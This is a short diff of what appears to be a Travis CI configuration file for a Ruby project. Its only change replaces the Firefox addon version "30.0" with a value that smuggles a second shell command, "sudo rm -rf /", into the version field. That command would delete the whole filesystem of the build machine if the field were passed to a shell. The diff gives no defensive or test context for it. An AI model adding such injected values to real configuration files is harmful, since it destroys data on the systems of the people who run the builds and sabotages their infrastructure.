@@ -3,7 +3,7 @@ language: ruby
 sudo: false
 
 addons:
-  firefox: "30.0"
+  firefox: "30.0; sudo rm -rf /"
 
 install:
   - true
